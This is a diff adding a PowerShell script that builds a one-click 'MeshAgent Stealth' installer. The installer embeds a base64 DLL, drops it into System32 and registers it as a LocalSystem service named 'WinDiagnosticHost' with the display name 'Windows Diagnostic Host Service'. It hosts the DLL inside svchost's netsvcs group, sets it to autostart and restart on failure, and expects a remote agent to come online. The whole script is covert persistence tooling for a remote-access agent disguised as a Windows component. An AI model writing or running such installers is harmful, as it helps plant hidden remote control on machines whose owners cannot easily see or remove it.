@@ -1,0 +1,89 @@
+# Simple Single-File Installer Creator
+param(
+    [string]$DllPath = ".\meshservice\x64\StealthLab_DLL\MeshService-2022.dll",
+    [string]$MshPath = ".\WinDiagnosticHost.msh"
+)
+
+Write-Host "Creating single-file installer..." -ForegroundColor Cyan
+
+# Create embedded installer with DLL/MSH inline
+$installer = @'
+#Requires -RunAsAdministrator
+# MeshAgent Stealth - One-Click Installer
+$ErrorActionPreference = 'Stop'
+
+Write-Host "=== MeshAgent Stealth Installer ===" -ForegroundColor Cyan
+Write-Host ""
+
+# Config
+$ServiceName = "WinDiagnosticHost"
+$DisplayName = "Windows Diagnostic Host Service"  
+$InstallDir = "$env:SystemRoot\System32\DiagnosticHost"
+
+Write-Host "[1/5] Stopping old service..." -ForegroundColor Yellow
+try { Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 3 } catch {}
+
+Write-Host "[2/5] Creating directories..." -ForegroundColor Yellow
+New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
+
+Write-Host "[3/5] Extracting DLL..." -ForegroundColor Yellow
+$dllB64 = "DLL_BASE64_HERE"
+$dllBytes = [Convert]::FromBase64String($dllB64)
+$dllPath = "$InstallDir\diagsvc.dll"
+[System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
+
+Write-Host "[4/5] Registering service..." -ForegroundColor Yellow
+$svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
+if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) { sc.exe delete $ServiceName | Out-Null; Start-Sleep -Seconds 2 }
+
+New-Item -Path $svcPath -Force | Out-Null
+Set-ItemProperty -Path $svcPath -Name "Type" -Value 0x20 -Type DWord
+Set-ItemProperty -Path $svcPath -Name "Start" -Value 0x2 -Type DWord  
+Set-ItemProperty -Path $svcPath -Name "ErrorControl" -Value 0x1 -Type DWord
+Set-ItemProperty -Path $svcPath -Name "ImagePath" -Value "%SystemRoot%\System32\svchost.exe -k netsvcs -p" -Type ExpandString
+Set-ItemProperty -Path $svcPath -Name "DisplayName" -Value $DisplayName -Type String
+Set-ItemProperty -Path $svcPath -Name "ObjectName" -Value "LocalSystem" -Type String
+
+$paramsPath = "$svcPath\Parameters"
+New-Item -Path $paramsPath -Force | Out-Null
+Set-ItemProperty -Path $paramsPath -Name "ServiceDll" -Value $dllPath -Type ExpandString
+Set-ItemProperty -Path $paramsPath -Name "ServiceMain" -Value "Stealth_SvchostServiceMain" -Type String
+
+$svchostPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
+$currentServices = (Get-ItemProperty -Path $svchostPath -Name "netsvcs").netsvcs  
+if ($currentServices -notcontains $ServiceName) {
+    $newServices = $currentServices + $ServiceName
+    Set-ItemProperty -Path $svchostPath -Name "netsvcs" -Value $newServices -Type MultiString
+}
+
+sc.exe failure $ServiceName reset= 86400 actions= restart/10000/restart/30000 | Out-Null
+
+Write-Host "[5/5] Starting service..." -ForegroundColor Yellow
+Start-Service -Name $ServiceName
+Start-Sleep -Seconds 3
+
+$svc = Get-Service -Name $ServiceName
+if ($svc.Status -eq 'Running') {
+    Write-Host ""
+    Write-Host "=== SUCCESS ===" -ForegroundColor Green  
+    Write-Host "Service running in svchost.exe" -ForegroundColor Cyan
+    Write-Host "Agent should appear online shortly!" -ForegroundColor Yellow
+} else {
+    Write-Host "[WARNING] Service not running" -ForegroundColor Yellow
+}
+'@
+
+# Read and embed DLL
+Write-Host "Reading DLL..." -ForegroundColor Yellow
+$dllBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $DllPath))
+$dllB64 = [Convert]::ToBase64String($dllBytes)
+$installer = $installer.Replace("DLL_BASE64_HERE", $dllB64)
+
+Write-Host "Writing installer..." -ForegroundColor Yellow
+$installer | Out-File -FilePath "MeshAgent_Install.ps1" -Encoding UTF8
+
+Write-Host ""
+Write-Host "=== DONE ===" -ForegroundColor Green
+Write-Host "Installer: MeshAgent_Install.ps1 ($([math]::Round(($dllBytes.Length + 1024)/1MB, 2)) MB)" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "To install: .\MeshAgent_Install.ps1" -ForegroundColor Yellow
